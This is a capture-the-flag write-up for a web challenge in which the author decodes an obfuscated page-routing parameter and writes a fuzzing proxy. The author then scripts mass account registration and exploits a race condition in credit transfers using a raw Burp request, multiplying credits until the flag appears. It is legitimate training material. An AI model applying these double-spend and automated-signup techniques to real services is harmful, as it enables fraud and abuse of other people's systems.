# AOTW 2019, 12th: Naughty List

* Points: 451
* Solves: 24 
* Author: b0bb
* Category: web

> Santa has been abusing his power and is union busting us elves. Any elves caught participating in union related activities have been put on a naughty list, if you can get me off the list I will give you a flag. 


## Task

The nicely designed webpage greats us with:

> You've been a naughty elf

> If you are here you have been a bad, bad elf. This holiday season, Santa has implemented a NO UNION policy in order to stay competitive with the likes of Amazon and AliExpress. We cannot afford to lose our competitive advantage due to your collective bargaining.

> Since you were caught attempting to participate in union related activities, you have been placed on a list for bad elves. Once on this list your Christmas related privileges have been revoked with immediate effect and you are now under a period of probation.

> In order to get off of this list, you will have to accumulate enough credits to show you are willing to participate in Christmas with the proper amount of Christmas spirit. Credits can be purchased with your hard earned gingerbread tokens in order to speed up your probation otherwise you will get a reduced wage of 1 gingerbread token per Christmas season (held in escrow). Once you have 5000 tokens, you can resume normal activities.

> Failure to meet these minimum demands will result in your entry to a re-education camp.

So the plan is obviously to get 5000 credits.


## Recon

The subpages available are:
* Home
* Contact
* Login
* Logout
* Register 
* Account (after login)

After logging in you have 1 credit. On the account page it's possible to transfer credits to another elf:

```
Transfer Credits

You can transfer your credits to another elf by using a destination code eg.
-7kmW57NgOKopO-EQko0Z3lDa3oxaVZZRUZrRyV5yWW6skMTR1pAqJaZp9k
```
Using this example destination code results in:
```
Successfully transferred 1 credits to santa.
```

Not what want unless we can guess santas password :) 

The account page also contained 3 deactivated buttons with buy_10, buy_25 and buy_99 and a countdown named "Next Credit:" which run until the end of the CTF, but I couldn't find a use for them.

The URLs of the sub pages contain the GET parameter page= with a base64-strings (URL safe mode) which changes on every reload of the page, e.g. 3 URLs of the contact page:

```
http://3.93.128.89:1212/?page=2k5sIQxoYQz_qPtAK00zajBrTmZwZz09aodPX3qsIwdmkOtqsBmnZA
http://3.93.128.89:1212/?page=i-kT7GGIDdCjQCDuZUU2ODR5WnpsUT09_bwQAF_No_qLBzoo4g9mJA
http://3.93.128.89:1212/?page=9QKufo-HmAn8MnybUVFEM1k0WGFwUT09pHSvCjhAErik4X42WaE5Uw
```

Decoding these strings shows that they contain:
1. some random garbage
2. another base64 string (+M3j0kNfpg== in the example below)
3. more random garbage

Example:
```
ÚNl!.ha.ÿ¨û@+M3j0kNfpg==j.O_z¬#.f.ëj°.§d
```

The inside b64 also decodes to randomness but the length was always the same, e.g. for the login page:
```
6n9Dpy4=
uhAGya4=
vkCCa/U=
3zYeM/Q=
DP1m5Q4=
C2HWAiM=
s8euZTM=
```

Contact page:
```
dRR7x9bWpQ==
pxcvL+ZrOg==
XO5ZBwtbWQ==
4brIjElz4w==
```

The length of the decoded b64 correlates with the length of the page name, e.g. login would have 5 chars, contact 7 and so on. So it could be e.g. XOR or some stream cipher. For some time I tried some basic known plain text attacks using the page names but with no success, and since the category wasn't crypto, I stopped that after a while.

Entering unencoded strings like ticks or my own b64 encoded stuff in the page= parameter redirects (using the Location: header) to a 404 page which contains the parameter from_page= with another b64 string:

```
http://3.93.128.89:1212/?page=404&from_page=VYB2nKcv2FFf7UxnRVE9PXHlUtYyODOk_RV7m9hEaaM
```

That looked promising to be a way to encode strings into the applications b64 schema so I tried to go to:

```
3.93.128.89:1212/?page=contact
```

That redirected to:
```
http://3.93.128.89:1212/?page=404&from_page=lEmyEQgLGyIqPBECSmpwUTNTejF0QT09Ah2A4gs_e16qC_1LtuQlUg
```

So took the from_page= b64 string, entered that in page=

```
http://3.93.128.89:1212/?page=lEmyEQgLGyIqPBECSmpwUTNTejF0QT09Ah2A4gs_e16qC_1LtuQlUg
```

That got me to the contact page, so "contact" equals lEmyEQgLGyIqPBECSmpwUTNTejF0QT09Ah2A4gs_e16qC_1LtuQlUg, hurray.

Using that method I tried some fuzzing using a proxy script which translated clear text into the b64 strings and fetched the resulting page. It did the following:
* Offer an HTTP service and wait for requests, e.g. http://3.93.128.89:1212/?page=Register
* Send incoming request to naughty list server
* Parse the resulting Location: header to get from_page= base64
* Request the found base64 string using page= and give that page back to the initial requestor aka burp intruder

```python
#!/usr/bin/python3 -u

# mitm proxy for usage as an burp upstream proxy 
# (only handles parameterized URLs so far ...)

import requests
import http.server


base_url = 'http://3.93.128.89:1212/'


def get_page(page):
    session = requests.Session()

    # get encrypted path to where we want to got from 404 redirect
    url = base_url + "?page=" + page
    print("getting 1st URL: " + url )
    # don't follow redirects because we want to the location header:
    resp = session.get(url, allow_redirects=False)

    # check http header Location:
    location=""
    try:
        location_header=resp.headers['Location']
        location = location_header.split('from_page=')[1]
        print("loc: " + location)
    except:
        pass

    #print(resp.headers)

    # get real page
    url = base_url + "?page=" + location
    print("getting 2nd URL: " + url )
    # this time allow redirects to see error pages
    resp = session.get(url, allow_redirects=True)
    html_page=resp.text
    #print("html page: " + html_page)
    print("-----------------------------------------------------------------")

    return html_page


class requesthandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        html=""
        page=""
        #print(self.path)
        if '?page=' in self.path:
            page = self.path.split('?page=')[1]
            print(("doing page: ".format(page)))
            html = get_page(page)
        else:
            print(("boring = ignoring: ".format(self.path)))
            html = "<HTML><BODY>ignored</BODY></HTML>"

        self.send_response(200)
        self.send_header('Content-Type', "text/html")

        self.end_headers()
        self.wfile.write(html.encode('utf8'))

if __name__ == '__main__':
    server_class = http.server.HTTPServer

    httpd = server_class(('127.0.0.1', 8888), requesthandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
```

Burp worked fine with using this proxy-script as an upstream proxy and I could easily check for the usual injection stuff and fuzzdbs commonmethods.txt but it neither found new attack surface nor any actionable errors.


## Solution

The example destination code for transfering tokens on the account page was also changing on every reload of the page, but always resulted in a transfer to santa, e.g.:

```
FwrFpV2CZbqUPMXUVUxxVDhPd0U0YVFBbm9MQsxQYKrs5f9q69AlFUIRL1U
fe1J-CTsV2PWht2CZ1V0cFJVWE5KTXIwaDNVUH9tPAp2w3ERNc2IbC0ummg
Q1fGAZbUApBrCsLQWFBsZ2RiYWRKenQ5M3VnOApoOZ53zdtBksAuT2aC7gk
```

It also contains an inside b64 which decodes to 12 chars of randomness. If those 12 chars trigger a transfer to santa, they might be something like e.g.
* accountsanta
* token==santa
* credit:santa
* ...

I tried several of the options which had 12 chars in length and with credit:santa I could transfer the 1 token to santa. This also worked with my own accounts, so after registering accounts A and B, I could transfer 1 token from A using credit:B, so B had 2 tokens. So I wrote a script to create 5000 elfs and transfer all their tokens to elf1:


```python
#!/usr/bin/python3 -u

import requests

url_reg = 'http://3.93.128.89:1212/?page=AsJ3r-FY6M-iZclFSWlkKzFBcTAwM009LNlBVUUgW8yvugAgfTu43w'
url_post_login = 'http://3.93.128.89:1212/?page=Qyx7zn071CqWrsuANElMa0ZsWT0p_sEa0UpGx3yowQrdzlYe'
url_post_transfer = 'http://3.93.128.89:1212/?page=r21aC1BxNkrFL_5xODJTOUsvakVldz09bFdDVeFIdFUWBIt3AWBLoA'
url_post_logout = 'http://3.93.128.89:1212/?page=Q5QBXjqqlLrlXHO2Z0dndU04a3IN-Y31yyKzEEYHgH-rXH2y'

pwd="q"

#cred_dest="7jJaQ3NaO1k9gUSCRE44cktlcEQrN2N5JDVb1k5Rqzdsm9YMhEGfWw"
# credit:elf1
cred_dest="z24KXwTpx-gkAiXkOTFNL3ZVbm43UHhWNE1VPQalAk-qDBMW6aCOB8byFFQ"

def reg(session, user):
    url = url_reg
    print("posting URL reg: " + url )
    resp = session.post(url,  data={'username' : user, 'password': pwd, 'confirm': pwd } )
    print("---------------------------------------------------------------------------")
    #print(resp.headers)
    #print(resp.text)

def login(session, user):
    url = url_post_login
    print("posting URL login: " + url )
    resp = session.post(url,  data={'username' : user, 'password': pwd } )

def transfer(session):
    # sample post params: credits=71&destination=NUts5_GLaJyjdIXad05QT0c4bVhGSnZqZ1VOVZYcaCAHCFVD0GQhkJJ2uiI
    url = url_post_transfer
    print("transfering credits to: " + cred_dest )
    print("posting URL transfer: " + url )
    resp = session.post(url,  data={'credits' : 1, 'destination': cred_dest } )
    print("---------------------------------------------------------------------------")
    #print(resp.headers)
    #print(resp.text)

def logout(session, user):
    url = url_post_logout
    print("postting URL logout: " + url )
    resp = session.post(url)

#for usernum in range(5001):
for usernum in range(14):
    session = requests.Session()
    user="elf" + str(usernum)
    print("doing user: " + user)
    reg(session, user)
    login(session, user)
    transfer(session)
    logout(session, user)

```

Running the script worked fine for a while but eventually only brought this error message:
```
Sorry little elf, only 15 accounts per hour
```

That limit must obviously be tied to the source IP so for a while I thought about using something like open proxies, thor or an anon VPN service to bypass it but somehow this didn't feel like it's the intended way. Also the challenge creator might have included the source IP in the base64 string to prevent that. Eventually I came up with the idea to check if there's a race condition in transferring the tokens, mostly because I saw a presentation on turbo intruder some days ago :) Before using turbo intruder or adapting my script, I used the normal burp to check if it's working at all. So I had my elf1 with the 15 credits from my script and used burp intruder to send 50 requests to transfer those tokens to elf2:

```

POST /?page=AM8d-Q14iCkl7ziCL21QQmMwV3hTZz098u96I6RF2VblRD0j0ZoF3w HTTP/1.1
Host: 3.93.128.89:1212
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://3.93.128.89:1212/?page=t8qOcoN5Sbwt3prCZWtZb0k4VWZWdz09i0fQBcK9P-ZaKoKj42dBZA
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://3.93.128.89:1212
DNT: 1
Connection: close
Cookie: PHPSESSID=5e4e4c3592a08600094d7988503e0f32; id=8dWx+VxM8zCzFLJUuWDVpk4dx78LOxEkMdFKKheC9Ms=
Upgrade-Insecure-Requests: 1
credits=15&destination=VU6N9yCsqBtrRc9CTVVLZG1NaldBQWxzQ0U0PaU8g-7rnVKOlW5cNiqDTtc&dummy=§§

```

Luckily it worked fast enough even with my kind of slow internet connection so elf2 had 150 credits after that. I transferred the tokens back to elf1 for 1500, back to elf2 and after reload the account page was blank and only showed the flag:

AOTW{S4n7A_c4nT_hAv3_3lF-cOnTroL_wi7H0uT_eLf-d1sCipl1N3}


